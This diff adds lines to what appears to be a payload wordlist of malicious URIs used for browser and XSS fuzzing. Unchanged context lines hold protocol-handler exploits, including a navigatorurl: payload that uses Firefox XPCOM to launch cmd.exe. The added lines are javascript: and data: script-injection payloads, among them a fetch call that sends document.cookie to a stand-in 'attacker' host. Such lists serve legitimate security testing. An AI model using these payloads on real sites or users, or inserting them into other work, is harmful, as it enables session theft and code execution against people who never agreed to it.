@@ -2,3 +2,17 @@ aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Sta
 firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
 navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
 res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:confirm(document.domain)
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:fetch('//attacker/x?c='+document.cookie)
+data:text/html,<script>alert(1)</script>
+data:text/html,<script>alert(document.domain)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+javascript:eval('alert(1)')
+javascript:`alert\x281\x29`
+//example.com/%0Ajavascript:alert(1)
+http://example.com/%0d%0ajavascript:alert(1)
+
